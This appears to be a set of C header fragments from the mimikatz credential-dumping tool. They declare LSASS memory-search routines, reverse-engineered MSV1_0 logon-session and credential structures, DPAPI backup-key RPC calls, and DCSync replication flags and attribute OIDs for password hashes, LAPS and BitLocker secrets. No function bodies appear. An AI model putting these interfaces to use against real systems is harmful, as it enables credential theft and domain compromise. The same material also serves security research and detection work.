DWORD kuhl_m_sekurlsa_sk_search(PBYTE data, DWORD size, BOOL light);
DWORD kuhl_m_sekurlsa_sk_search_file(LPCWSTR filename);

NTSTATUS kuhl_m_sekurlsa_sk_bootKey(int argc, wchar_t* argv[]);
BOOL kuhl_m_sekurlsa_sk_tryDecode(PLSAISO_DATA_BLOB blob, PBYTE *output, DWORD *cbOutput);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "globals_sekurlsa.h"
//#include "kuhl_m_sekurlsa.h"
//#include "../modules/kull_m_memory.h"

PLIST_ENTRY LogonSessionList;
PULONG LogonSessionListCount;

PVOID kuhl_m_sekurlsa_utils_pFromLinkedListByLuid(PKULL_M_MEMORY_ADDRESS pSecurityStruct, ULONG LUIDoffset, PLUID luidToFind);
PVOID kuhl_m_sekurlsa_utils_pFromAVLByLuid(PKULL_M_MEMORY_ADDRESS pTable, ULONG LUIDoffset, PLUID luidToFind);
PVOID kuhl_m_sekurlsa_utils_pFromAVLByLuidRec(PKULL_M_MEMORY_ADDRESS pTable, ULONG LUIDoffset, PLUID luidToFind);

BOOL kuhl_m_sekurlsa_utils_search(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB pLib);
BOOL kuhl_m_sekurlsa_utils_search_generic(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB pLib, PKULL_M_PATCH_GENERIC generics, SIZE_T cbGenerics, PVOID * genericPtr, PVOID * genericPtr1, PVOID * genericPtr2, PLONG genericOffset1);

typedef struct _KIWI_MSV1_0_PRIMARY_CREDENTIALS {
	struct _KIWI_MSV1_0_PRIMARY_CREDENTIALS *next;
	ANSI_STRING Primary;
	LSA_UNICODE_STRING Credentials;
} KIWI_MSV1_0_PRIMARY_CREDENTIALS, *PKIWI_MSV1_0_PRIMARY_CREDENTIALS;

typedef struct _KIWI_MSV1_0_CREDENTIALS {
	struct _KIWI_MSV1_0_CREDENTIALS *next;
	DWORD AuthenticationPackageId;
	PKIWI_MSV1_0_PRIMARY_CREDENTIALS PrimaryCredentials;
} KIWI_MSV1_0_CREDENTIALS, *PKIWI_MSV1_0_CREDENTIALS;

typedef struct _KIWI_MSV1_0_LIST_51 {
	struct _KIWI_MSV1_0_LIST_51 *Flink;
	struct _KIWI_MSV1_0_LIST_51 *Blink;
	LUID LocallyUniqueIdentifier;
	LSA_UNICODE_STRING UserName;
	LSA_UNICODE_STRING Domaine;
	PVOID unk0;
	PVOID unk1;
	PSID  pSid;
	ULONG LogonType;
	ULONG Session;
	LARGE_INTEGER LogonTime; // autoalign x86
	LSA_UNICODE_STRING LogonServer;
	PKIWI_MSV1_0_CREDENTIALS Credentials;
	ULONG unk19;
	PVOID unk20;
	PVOID unk21;
	PVOID unk22;
	ULONG unk23;
	PVOID CredentialManager;
} KIWI_MSV1_0_LIST_51, *PKIWI_MSV1_0_LIST_51;

typedef struct _KIWI_MSV1_0_LIST_52 {
	struct _KIWI_MSV1_0_LIST_52 *Flink;
	struct _KIWI_MSV1_0_LIST_52 *Blink;
	LUID LocallyUniqueIdentifier;
	LSA_UNICODE_STRING UserName;
	LSA_UNICODE_STRING Domaine;
	PVOID unk0;
	PVOID unk1;
	PSID  pSid;
	ULONG LogonType;
	ULONG Session;
	LARGE_INTEGER LogonTime; // autoalign x86
	LSA_UNICODE_STRING LogonServer;
	PKIWI_MSV1_0_CREDENTIALS Credentials;
	ULONG unk19;
	PVOID unk20;
	PVOID unk21;
	ULONG unk22;
	PVOID CredentialManager;
} KIWI_MSV1_0_LIST_52, *PKIWI_MSV1_0_LIST_52;

typedef struct _KIWI_MSV1_0_LIST_60 {
	struct _KIWI_MSV1_0_LIST_6 *Flink;
	struct _KIWI_MSV1_0_LIST_6 *Blink;
	PVOID unk0;
	ULONG unk1;
	PVOID unk2;
	ULONG unk3;
	ULONG unk4;
	ULONG unk5;
	HANDLE hSemaphore6;
	PVOID unk7;
	HANDLE hSemaphore8;
	PVOID unk9;
	PVOID unk10;
	ULONG unk11;
	ULONG unk12;
	PVOID unk13;
	LUID LocallyUniqueIdentifier;
	LUID SecondaryLocallyUniqueIdentifier;
	LSA_UNICODE_STRING UserName;
	LSA_UNICODE_STRING Domaine;
	PVOID unk14;
	PVOID unk15;
	PSID  pSid;
	ULONG LogonType;
	ULONG Session;
	LARGE_INTEGER LogonTime; // autoalign x86
	LSA_UNICODE_STRING LogonServer;
	PKIWI_MSV1_0_CREDENTIALS Credentials;
	ULONG unk19;
	PVOID unk20;
	PVOID unk21;
	PVOID unk22;
	ULONG unk23;
	PVOID CredentialManager;
} KIWI_MSV1_0_LIST_60, *PKIWI_MSV1_0_LIST_60;

typedef struct _KIWI_MSV1_0_LIST_61 {
	struct _KIWI_MSV1_0_LIST_6 *Flink;
	struct _KIWI_MSV1_0_LIST_6 *Blink;
	PVOID unk0;
	ULONG unk1;
	PVOID unk2;
	ULONG unk3;
	ULONG unk4;
	ULONG unk5;
	HANDLE hSemaphore6;
	PVOID unk7;
	HANDLE hSemaphore8;
	PVOID unk9;
	PVOID unk10;
	ULONG unk11;
	ULONG unk12;
	PVOID unk13;
	LUID LocallyUniqueIdentifier;
	LUID SecondaryLocallyUniqueIdentifier;
	LSA_UNICODE_STRING UserName;
	LSA_UNICODE_STRING Domaine;
	PVOID unk14;
	PVOID unk15;
	PSID  pSid;
	ULONG LogonType;
	ULONG Session;
	LARGE_INTEGER LogonTime; // autoalign x86
	LSA_UNICODE_STRING LogonServer;
	PKIWI_MSV1_0_CREDENTIALS Credentials;
	PVOID unk19;
	PVOID unk20;
	PVOID unk21;
	ULONG unk22;
	PVOID CredentialManager;
} KIWI_MSV1_0_LIST_61, *PKIWI_MSV1_0_LIST_61;

typedef struct _KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ {
	struct _KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ *Flink;
	struct _KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ *Blink;
	PVOID unk0;
	ULONG unk1;
	PVOID unk2;
	ULONG unk3;
	ULONG unk4;
	ULONG unk5;
	HANDLE hSemaphore6;
	PVOID unk7;
	HANDLE hSemaphore8;
	PVOID unk9;
	PVOID unk10;
	ULONG unk11;
	ULONG unk12;
	PVOID unk13;
	LUID LocallyUniqueIdentifier;
	LUID SecondaryLocallyUniqueIdentifier;
	BYTE waza[12]; /// to do (maybe align) <===================
	LSA_UNICODE_STRING UserName;
	LSA_UNICODE_STRING Domaine;
	PVOID unk14;
	PVOID unk15;
	PSID  pSid;
	ULONG LogonType;
	ULONG Session;
	LARGE_INTEGER LogonTime; // autoalign x86
	LSA_UNICODE_STRING LogonServer;
	PKIWI_MSV1_0_CREDENTIALS Credentials;
	PVOID unk19;
	PVOID unk20;
	PVOID unk21;
	ULONG unk22;
	PVOID CredentialManager;
} KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, *PKIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ;

typedef struct _KIWI_MSV1_0_LIST_62 {
	struct _KIWI_MSV1_0_LIST_62 *Flink;
	struct _KIWI_MSV1_0_LIST_62 *Blink;
	PVOID unk0;
	ULONG unk1;
	PVOID unk2;
	ULONG unk3;
	ULONG unk4;
	ULONG unk5;
	HANDLE hSemaphore6;
	PVOID unk7;
	HANDLE hSemaphore8;
	PVOID unk9;
	PVOID unk10;
	ULONG unk11;
	ULONG unk12;
	PVOID unk13;
	LUID LocallyUniqueIdentifier;
	LUID SecondaryLocallyUniqueIdentifier;
	LSA_UNICODE_STRING UserName;
	LSA_UNICODE_STRING Domaine;
	PVOID unk14;
	PVOID unk15;
	LSA_UNICODE_STRING Type;
	PSID  pSid;
	ULONG LogonType;
	PVOID unk18;
	ULONG Session;
	LARGE_INTEGER LogonTime; // autoalign x86
	LSA_UNICODE_STRING LogonServer;
	PKIWI_MSV1_0_CREDENTIALS Credentials;
	PVOID unk19;
	PVOID unk20;
	PVOID unk21;
	ULONG unk22;
	ULONG unk23;
	ULONG unk24;
	ULONG unk25;
	ULONG unk26;
	PVOID unk27;
	PVOID unk28;
	PVOID unk29;
	PVOID CredentialManager;
} KIWI_MSV1_0_LIST_62, *PKIWI_MSV1_0_LIST_62;

typedef struct _KIWI_MSV1_0_LIST_63 {
	struct _KIWI_MSV1_0_LIST_63 *Flink;	//off_2C5718
	struct _KIWI_MSV1_0_LIST_63 *Blink; //off_277380
	PVOID unk0; // unk_2C0AC8
	ULONG unk1; // 0FFFFFFFFh
	PVOID unk2; // 0
	ULONG unk3; // 0
	ULONG unk4; // 0
	ULONG unk5; // 0A0007D0h
	HANDLE hSemaphore6; // 0F9Ch
	PVOID unk7; // 0
	HANDLE hSemaphore8; // 0FB8h
	PVOID unk9; // 0
	PVOID unk10; // 0
	ULONG unk11; // 0
	ULONG unk12; // 0 
	PVOID unk13; // unk_2C0A28
	LUID LocallyUniqueIdentifier;
	LUID SecondaryLocallyUniqueIdentifier;
	BYTE waza[12]; /// to do (maybe align)
	LSA_UNICODE_STRING UserName;
	LSA_UNICODE_STRING Domaine;
	PVOID unk14;
	PVOID unk15;
	LSA_UNICODE_STRING Type;
	PSID  pSid;
	ULONG LogonType;
	PVOID unk18;
	ULONG Session;
	LARGE_INTEGER LogonTime; // autoalign x86
	LSA_UNICODE_STRING LogonServer;
	PKIWI_MSV1_0_CREDENTIALS Credentials;
	PVOID unk19;
	PVOID unk20;
	PVOID unk21;
	ULONG unk22;
	ULONG unk23;
	ULONG unk24;
	ULONG unk25;
	ULONG unk26;
	PVOID unk27;
	PVOID unk28;
	PVOID unk29;
	PVOID CredentialManager;
} KIWI_MSV1_0_LIST_63, *PKIWI_MSV1_0_LIST_63;



/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "globals.h"
#ifndef __REQUIRED_RPCNDR_H_VERSION__
#define __REQUIRED_RPCNDR_H_VERSION__ 475
#endif



#ifndef __RPCNDR_H_VERSION__
#error this stub requires an updated version of <rpcndr.h>
#endif // __RPCNDR_H_VERSION__

//#include "midles.h"

//#include "../kull_m_string.h"
//#include "../kull_m_crypto.h"
//#include "../kull_m_process.h"


LPCWSTR KULL_M_RPC_AUTHNLEV[7];
LPCWSTR KULL_M_RPC_AUTHNSVC(DWORD AuthnSvc);
const SEC_WINNT_AUTH_IDENTITY KULL_M_RPC_NULLSESSION;

#define KULL_M_RPC_AUTH_IDENTITY_HANDLE_NULLSESSION ((RPC_AUTH_IDENTITY_HANDLE) &KULL_M_RPC_NULLSESSION)

BOOL kull_m_rpc_createBinding(LPCWSTR uuid, LPCWSTR ProtSeq, LPCWSTR NetworkAddr, LPCWSTR Endpoint, LPCWSTR Service, BOOL addServiceToNetworkAddr, DWORD AuthnSvc, RPC_AUTH_IDENTITY_HANDLE hAuth, DWORD ImpersonationType, RPC_BINDING_HANDLE *hBinding, void (RPC_ENTRY * RpcSecurityCallback)(void *));
BOOL kull_m_rpc_deleteBinding(RPC_BINDING_HANDLE *hBinding);
RPC_STATUS CALLBACK kull_m_rpc_nice_SecurityCallback(RPC_IF_HANDLE hInterface, void* pBindingHandle);
RPC_STATUS CALLBACK kull_m_rpc_nice_verb_SecurityCallback(RPC_IF_HANDLE hInterface, void* pBindingHandle);
void kull_m_rpc_getArgs(int argc, wchar_t * argv[], LPCWSTR *szRemote, LPCWSTR *szProtSeq, LPCWSTR *szEndpoint, LPCWSTR *szService, LPCWSTR szDefaultService, DWORD *AuthnSvc, DWORD defAuthnSvc, BOOL *isNullSession, SEC_WINNT_AUTH_IDENTITY *pAuthIdentity, GUID *altGuid, BOOL printIt);
PMIDL_STUB_DESC kull_m_rpc_find_stub(LPCWSTR szModuleName, const RPC_SYNTAX_IDENTIFIER *pInterfaceId);
BOOL kull_m_rpc_replace_first_routine_pair_direct(const GENERIC_BINDING_ROUTINE_PAIR *pOriginalBindingPair, const GENERIC_BINDING_ROUTINE_PAIR *pNewBindingPair);
BOOL kull_m_rpc_replace_first_routine_pair(LPCWSTR szModuleName, const RPC_SYNTAX_IDENTIFIER *pInterfaceId, const GENERIC_BINDING_ROUTINE_PAIR *pNewBindingPair, PGENERIC_BINDING_ROUTINE_PAIR pOriginalBindingPair, const GENERIC_BINDING_ROUTINE_PAIR **ppOriginalBindingPair);

typedef struct _KULL_M_RPC_FCNSTRUCT {
	PVOID addr;
	size_t size;
} KULL_M_RPC_FCNSTRUCT, *PKULL_M_RPC_FCNSTRUCT;

void __RPC_FAR * __RPC_USER midl_user_allocate(size_t cBytes);
void __RPC_USER midl_user_free(void __RPC_FAR * p);
void __RPC_USER ReadFcn(void *State, char **pBuffer, unsigned int *pSize);
void __RPC_USER WriteFcn(void *State, char *Buffer, unsigned int Size);
void __RPC_USER AllocFcn(void *State, char **pBuffer, unsigned int *pSize);

#define RPC_EXCEPTION (RpcExceptionCode() != STATUS_ACCESS_VIOLATION) && \
	(RpcExceptionCode() != STATUS_DATATYPE_MISALIGNMENT) && \
	(RpcExceptionCode() != STATUS_PRIVILEGED_INSTRUCTION) && \
	(RpcExceptionCode() != STATUS_ILLEGAL_INSTRUCTION) && \
	(RpcExceptionCode() != STATUS_BREAKPOINT) && \
	(RpcExceptionCode() != STATUS_STACK_OVERFLOW) && \
	(RpcExceptionCode() != STATUS_IN_PAGE_ERROR) && \
	(RpcExceptionCode() != STATUS_ASSERTION_FAILURE) && \
	(RpcExceptionCode() != STATUS_STACK_BUFFER_OVERRUN) && \
	(RpcExceptionCode() != STATUS_GUARD_PAGE_VIOLATION)

typedef void (* PGENERIC_RPC_DECODE) (IN handle_t pHandle, IN PVOID pObject);
typedef void (* PGENERIC_RPC_ENCODE) (IN handle_t pHandle, IN PVOID pObject);
typedef void (* PGENERIC_RPC_FREE) (IN handle_t pHandle, IN PVOID pObject);
typedef size_t (* PGENERIC_RPC_ALIGNSIZE) (IN handle_t pHandle, IN PVOID pObject);

BOOL kull_m_rpc_Generic_Decode(PVOID data, DWORD size, PVOID pObject, PGENERIC_RPC_DECODE fDecode);
void kull_m_rpc_Generic_Free(PVOID data, PGENERIC_RPC_FREE fFree);
BOOL kull_m_rpc_Generic_Encode(PVOID pObject, PVOID *data, DWORD *size, PGENERIC_RPC_ENCODE fEncode, PGENERIC_RPC_ALIGNSIZE fAlignSize);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "globals.h"
//#include "kull_m_rpc_ms-bkrp.h"
//#include "../kull_m_net.h"

BOOL kull_m_rpc_bkrp_createBinding(LPCWSTR NetworkAddr, RPC_BINDING_HANDLE *hBinding);

BOOL kull_m_rpc_bkrp_generic(LPCWSTR NetworkAddr, const GUID * pGuid, PVOID DataIn, DWORD dwDataIn, PVOID *pDataOut, DWORD *pdwDataOut);

BOOL kull_m_rpc_bkrp_Restore(LPCWSTR NetworkAddr, PVOID DataIn, DWORD dwDataIn, PVOID *pDataOut, DWORD *pdwDataOut);
BOOL kull_m_rpc_bkrp_Backup(LPCWSTR NetworkAddr, PVOID DataIn, DWORD dwDataIn, PVOID *pDataOut, DWORD *pdwDataOut);
BOOL kull_m_rpc_bkrp_BackupKey(LPCWSTR NetworkAddr, PVOID *pDataOut, DWORD *pdwDataOut);

//#pragma once
//#include "kull_m_rpc.h"
//#include "../kull_m_crypto.h"





typedef struct _KUHL_M_DPAPI_ENTRIES {
	DWORD MasterKeyCount;
	PKUHL_M_DPAPI_MASTERKEY_ENTRY *MasterKeys;
	DWORD CredentialCount;
	PKUHL_M_DPAPI_CREDENTIAL_ENTRY *Credentials;
	DWORD DomainKeyCount;
	PKUHL_M_DPAPI_DOMAINKEY_ENTRY *DomainKeys;
} KUHL_M_DPAPI_ENTRIES, *PKUHL_M_DPAPI_ENTRIES;

size_t KUHL_M_DPAPI_ENTRIES_AlignSize(handle_t _MidlEsHandle, KUHL_M_DPAPI_ENTRIES * _pType);
void KUHL_M_DPAPI_ENTRIES_Encode(handle_t _MidlEsHandle, KUHL_M_DPAPI_ENTRIES * _pType);
void KUHL_M_DPAPI_ENTRIES_Decode(handle_t _MidlEsHandle, KUHL_M_DPAPI_ENTRIES * _pType);
void KUHL_M_DPAPI_ENTRIES_Free(handle_t _MidlEsHandle, KUHL_M_DPAPI_ENTRIES * _pType);

#define kull_m_dpapi_oe_DecodeDpapiEntries(/*PVOID */data, /*DWORD */size, /*KUHL_M_DPAPI_ENTRIES **/pObject) kull_m_rpc_Generic_Decode(data, size, pObject, (PGENERIC_RPC_DECODE) KUHL_M_DPAPI_ENTRIES_Decode)
#define kull_m_dpapi_oe_FreeDpapiEntries(/*KUHL_M_DPAPI_ENTRIES **/pObject) kull_m_rpc_Generic_Free(pObject, (PGENERIC_RPC_FREE) KUHL_M_DPAPI_ENTRIES_Free)
#define kull_m_dpapi_oe_EncodeDpapiEntries(/*KUHL_M_DPAPI_ENTRIES **/pObject, /*PVOID **/data, /*DWORD **/size) kull_m_rpc_Generic_Encode(pObject, data, size, (PGENERIC_RPC_ENCODE) KUHL_M_DPAPI_ENTRIES_Encode, (PGENERIC_RPC_ALIGNSIZE) KUHL_M_DPAPI_ENTRIES_AlignSize)

/*	Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com / https://blog.gentilkiwi.com )
	Vincent LE TOUX ( vincent.letoux@gmail.com / http://www.mysmartlogon.com )
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "globals.h"
//#include "../kull_m_crypto_system.h"
//#include "../kull_m_crypto.h"
//#include "../kull_m_string.h"
//#include "../kull_m_asn1.h"
//#include "../kull_m_token.h"
//#include "kull_m_rpc_ms-drsr.h"

typedef struct _DRS_EXTENSIONS_INT {
	DWORD cb;
	DWORD dwFlags;
	GUID SiteObjGuid;
	DWORD Pid;
	DWORD dwReplEpoch;
	DWORD dwFlagsExt;
	GUID ConfigObjGUID;
	DWORD dwExtCaps;
} DRS_EXTENSIONS_INT, *PDRS_EXTENSIONS_INT;

typedef struct _ENCRYPTED_PAYLOAD {
	UCHAR Salt[16];
	ULONG CheckSum;
	UCHAR EncryptedData[ANYSIZE_ARRAY];
} ENCRYPTED_PAYLOAD, *PENCRYPTED_PAYLOAD;

#define DRS_EXT_BASE								0x00000001
#define DRS_EXT_ASYNCREPL							0x00000002
#define DRS_EXT_REMOVEAPI							0x00000004
#define DRS_EXT_MOVEREQ_V2							0x00000008
#define DRS_EXT_GETCHG_DEFLATE						0x00000010
#define DRS_EXT_DCINFO_V1							0x00000020
#define DRS_EXT_RESTORE_USN_OPTIMIZATION			0x00000040
#define DRS_EXT_ADDENTRY							0x00000080
#define DRS_EXT_KCC_EXECUTE							0x00000100
#define DRS_EXT_ADDENTRY_V2							0x00000200
#define DRS_EXT_LINKED_VALUE_REPLICATION			0x00000400
#define DRS_EXT_DCINFO_V2							0x00000800
#define DRS_EXT_INSTANCE_TYPE_NOT_REQ_ON_MOD		0x00001000
#define DRS_EXT_CRYPTO_BIND							0x00002000
#define DRS_EXT_GET_REPL_INFO						0x00004000
#define DRS_EXT_STRONG_ENCRYPTION					0x00008000
#define DRS_EXT_DCINFO_VFFFFFFFF					0x00010000
#define DRS_EXT_TRANSITIVE_MEMBERSHIP				0x00020000
#define DRS_EXT_ADD_SID_HISTORY						0x00040000
#define DRS_EXT_POST_BETA3							0x00080000
#define DRS_EXT_GETCHGREQ_V5						0x00100000
#define DRS_EXT_GETMEMBERSHIPS2						0x00200000
#define DRS_EXT_GETCHGREQ_V6						0x00400000
#define DRS_EXT_NONDOMAIN_NCS						0x00800000
#define DRS_EXT_GETCHGREQ_V8						0x01000000
#define DRS_EXT_GETCHGREPLY_V5						0x02000000
#define DRS_EXT_GETCHGREPLY_V6						0x04000000
#define DRS_EXT_WHISTLER_BETA3						0x08000000
#define DRS_EXT_W2K3_DEFLATE						0x10000000
#define DRS_EXT_GETCHGREQ_V10						0x20000000
#define DRS_EXT_RESERVED_FOR_WIN2K_OR_DOTNET_PART2	0x40000000
#define DRS_EXT_RESERVED_FOR_WIN2K_OR_DOTNET_PART3	0x80000000

#define	DRS_EXT_ADAM								0x00000001
#define	DRS_EXT_LH_BETA2							0x00000002
#define	DRS_EXT_RECYCLE_BIN							0x00000004
#define DRS_EXT_GETCHGREPLY_V9						0x00000100
#define DRS_EXT_PAM									0x00000200

#define DRS_ASYNC_OP								0x00000001
#define DRS_GETCHG_CHECK							0x00000002
#define DRS_UPDATE_NOTIFICATION						0x00000002
#define DRS_ADD_REF									0x00000004
#define DRS_SYNC_ALL								0x00000008
#define DRS_DEL_REF									0x00000008
#define DRS_WRIT_REP								0x00000010
#define DRS_INIT_SYNC								0x00000020
#define DRS_PER_SYNC								0x00000040
#define DRS_MAIL_REP								0x00000080
#define DRS_ASYNC_REP								0x00000100
#define DRS_IGNORE_ERROR							0x00000100
#define DRS_TWOWAY_SYNC								0x00000200
#define DRS_CRITICAL_ONLY							0x00000400
#define DRS_GET_ANC									0x00000800
#define DRS_GET_NC_SIZE								0x00001000
#define DRS_LOCAL_ONLY								0x00001000
#define DRS_NONGC_RO_REP							0x00002000
#define DRS_SYNC_BYNAME								0x00004000
#define DRS_REF_OK									0x00004000
#define DRS_FULL_SYNC_NOW							0x00008000
#define DRS_NO_SOURCE								0x00008000
#define DRS_FULL_SYNC_IN_PROGRESS					0x00010000
#define DRS_FULL_SYNC_PACKET						0x00020000
#define DRS_SYNC_REQUEUE							0x00040000
#define DRS_SYNC_URGENT								0x00080000
#define DRS_REF_GCSPN								0x00100000
#define DRS_NO_DISCARD								0x00100000
#define DRS_NEVER_SYNCED							0x00200000
#define DRS_SPECIAL_SECRET_PROCESSING				0x00400000
#define DRS_INIT_SYNC_NOW							0x00800000
#define DRS_PREEMPTED								0x01000000
#define DRS_SYNC_FORCED								0x02000000
#define DRS_DISABLE_AUTO_SYNC						0x04000000
#define DRS_DISABLE_PERIODIC_SYNC					0x08000000
#define DRS_USE_COMPRESSION							0x10000000
#define DRS_NEVER_NOTIFY							0x20000000
#define DRS_SYNC_PAS								0x40000000
#define DRS_GET_ALL_GROUP_MEMBERSHIP				0x80000000

#define ENTINF_FROM_MASTER							0x00000001
#define ENTINF_DYNAMIC_OBJECT						0x00000002
#define ENTINF_REMOTE_MODIFY						0x00010000

typedef enum {
	DS_UNKNOWN_NAME = 0,
	DS_FQDN_1779_NAME = 1,
	DS_NT4_ACCOUNT_NAME = 2,
	DS_DISPLAY_NAME = 3,
	DS_UNIQUE_ID_NAME = 6,
	DS_CANONICAL_NAME = 7,
	DS_USER_PRINCIPAL_NAME = 8,
	DS_CANONICAL_NAME_EX = 9,
	DS_SERVICE_PRINCIPAL_NAME = 10,
	DS_SID_OR_SID_HISTORY_NAME = 11,
	DS_DNS_DOMAIN_NAME = 12,

	DS_LIST_SITES = -1,
	DS_LIST_SERVERS_IN_SITE = -2,
	DS_LIST_DOMAINS_IN_SITE = -3,
	DS_LIST_SERVERS_FOR_DOMAIN_IN_SITE = -4,
	DS_LIST_INFO_FOR_SERVER = -5,
	DS_LIST_ROLES = -6,
	DS_NT4_ACCOUNT_NAME_SANS_DOMAIN = -7,
	DS_MAP_SCHEMA_GUID = -8,
	DS_LIST_DOMAINS = -9,
	DS_LIST_NCS = -10,
	DS_ALT_SECURITY_IDENTITIES_NAME = -11,
	DS_STRING_SID_NAME = -12,
	DS_LIST_SERVERS_WITH_DCS_IN_SITE = -13,
	DS_USER_PRINCIPAL_NAME_FOR_LOGON = -14,
	DS_LIST_GLOBAL_CATALOG_SERVERS = -15,
	DS_NT4_ACCOUNT_NAME_SANS_DOMAIN_EX = -16,
	DS_USER_PRINCIPAL_NAME_AND_ALTSECID = -17,
} DS_NAME_FORMAT;

typedef enum  { 
	DS_NAME_NO_ERROR = 0,
	DS_NAME_ERROR_RESOLVING = 1,
	DS_NAME_ERROR_NOT_FOUND = 2,
	DS_NAME_ERROR_NOT_UNIQUE = 3,
	DS_NAME_ERROR_NO_MAPPING = 4,
	DS_NAME_ERROR_DOMAIN_ONLY = 5,
	DS_NAME_ERROR_NO_SYNTACTICAL_MAPPING = 6,
	DS_NAME_ERROR_TRUST_REFERRAL = 7
} DS_NAME_ERROR;

typedef enum {
	EXOP_FSMO_REQ_ROLE = 1,
	EXOP_FSMO_REQ_RID_ALLOC = 2,
	EXOP_FSMO_RID_REQ_ROLE = 3,
	EXOP_FSMO_REQ_PDC = 4,
	EXOP_FSMO_ABANDON_ROLE = 5,
	EXOP_REPL_OBJ = 6,
	EXOP_REPL_SECRETS = 7
} EXOP_REQ;

#define szOID_objectclass					"2.5.4.0"
#define szOID_hasMasterNCs					"1.2.840.113556.1.2.14"
#define szOID_dMDLocation					"1.2.840.113556.1.2.36"
#define szOID_isDeleted						"1.2.840.113556.1.2.48"
#define szOID_invocationId					"1.2.840.113556.1.2.115"

#define szOID_ANSI_name						"1.2.840.113556.1.4.1"
#define szOID_objectGUID					"1.2.840.113556.1.4.2"

#define szOID_ANSI_sAMAccountName			"1.2.840.113556.1.4.221"
#define szOID_ANSI_userPrincipalName		"1.2.840.113556.1.4.656"
#define szOID_ANSI_servicePrincipalName		"1.2.840.113556.1.4.771"
#define szOID_ANSI_sAMAccountType			"1.2.840.113556.1.4.302"
#define szOID_ANSI_userAccountControl		"1.2.840.113556.1.4.8"
#define szOID_ANSI_accountExpires			"1.2.840.113556.1.4.159"
#define szOID_ANSI_pwdLastSet				"1.2.840.113556.1.4.96"
#define szOID_ANSI_objectSid				"1.2.840.113556.1.4.146"
#define szOID_ANSI_sIDHistory				"1.2.840.113556.1.4.609"
#define szOID_ANSI_unicodePwd				"1.2.840.113556.1.4.90"
#define szOID_ANSI_ntPwdHistory				"1.2.840.113556.1.4.94"
#define szOID_ANSI_dBCSPwd					"1.2.840.113556.1.4.55"
#define szOID_ANSI_lmPwdHistory				"1.2.840.113556.1.4.160"
#define szOID_ANSI_supplementalCredentials	"1.2.840.113556.1.4.125"

// bitlocker
#define szOID_ANSI_msFVERecoveryPassword	"1.2.840.113556.1.4.1964"
#define szOID_ANSI_msFVERecoveryGuid		"1.2.840.113556.1.4.1965"
#define szOID_ANSI_msFVEVolumeGuid			"1.2.840.113556.1.4.1998"
#define szOID_ANSI_msFVEKeyPackage			"1.2.840.113556.1.4.1999"

// LAPS
#define szOID_ANSI_msMcsAdmPwd				"1.2.840.113556.1.8000.2554.50051.45980.28112.18903.35903.6685103.1224907.2.1"
#define szOID_ANSI_msMcsAdmPwdExpirationTime	"1.2.840.113556.1.8000.2554.50051.45980.28112.18903.35903.6685103.1224907.2.2"

#define szOID_ANSI_trustPartner				"1.2.840.113556.1.4.133"
#define szOID_ANSI_trustAuthIncoming		"1.2.840.113556.1.4.129"
#define szOID_ANSI_trustAuthOutgoing		"1.2.840.113556.1.4.135"

#define szOID_ANSI_currentValue				"1.2.840.113556.1.4.27"

#define szOID_options						"1.2.840.113556.1.4.307"
#define szOID_systemFlags					"1.2.840.113556.1.4.375"
#define szOID_ldapServer_show_deleted		"1.2.840.113556.1.4.417"
#define szOID_serverReference				"1.2.840.113556.1.4.515"
#define szOID_msDS_Behavior_Version			"1.2.840.113556.1.4.1459"
#define szOID_msDS_ReplicationEpoch			"1.2.840.113556.1.4.1720"
#define szOID_msDS_HasDomainNCs				"1.2.840.113556.1.4.1820"
#define szOID_msDS_hasMasterNCs				"1.2.840.113556.1.4.1836"
#define szOID_isRecycled					"1.2.840.113556.1.4.2058"

#define szOID_ANSI_nTDSDSA					"1.2.840.113556.1.5.7000.47"

#define ATT_WHEN_CREATED				MAKELONG(  2, 2)
#define ATT_WHEN_CHANGED				MAKELONG(  3, 2)

#define ATT_RDN							MAKELONG(  1, 9)
#define ATT_OBJECT_SID					MAKELONG(146, 9)
#define ATT_SAM_ACCOUNT_NAME			MAKELONG(221, 9)
#define ATT_USER_PRINCIPAL_NAME			MAKELONG(656, 9)
#define ATT_SERVICE_PRINCIPAL_NAME		MAKELONG(771, 9)
#define ATT_SID_HISTORY					MAKELONG(609, 9)
#define ATT_USER_ACCOUNT_CONTROL		MAKELONG(  8, 9)
#define ATT_SAM_ACCOUNT_TYPE			MAKELONG(302, 9)
#define ATT_LOGON_HOURS					MAKELONG( 64, 9)
#define ATT_LOGON_WORKSTATION			MAKELONG( 65, 9)
#define ATT_LAST_LOGON					MAKELONG( 52, 9)
#define ATT_PWD_LAST_SET				MAKELONG( 96, 9)
#define ATT_ACCOUNT_EXPIRES				MAKELONG(159, 9)
#define ATT_LOCKOUT_TIME				MAKELONG(662, 9)

#define ATT_UNICODE_PWD					MAKELONG( 90, 9)
#define ATT_NT_PWD_HISTORY				MAKELONG( 94, 9)
#define ATT_DBCS_PWD					MAKELONG( 55, 9)
#define ATT_LM_PWD_HISTORY				MAKELONG(160, 9)
#define ATT_SUPPLEMENTAL_CREDENTIALS	MAKELONG(125, 9)

#define ATT_CURRENT_VALUE				MAKELONG( 27, 9)

#define ATT_TRUST_ATTRIBUTES			MAKELONG(470, 9)
#define ATT_TRUST_AUTH_INCOMING			MAKELONG(129, 9)
#define ATT_TRUST_AUTH_OUTGOING			MAKELONG(135, 9)
#define ATT_TRUST_DIRECTION				MAKELONG(132, 9)
#define ATT_TRUST_PARENT				MAKELONG(471, 9)
#define ATT_TRUST_PARTNER				MAKELONG(133, 9)
#define ATT_TRUST_TYPE					MAKELONG(136, 9)

void RPC_ENTRY kull_m_rpc_drsr_RpcSecurityCallback(void *Context);

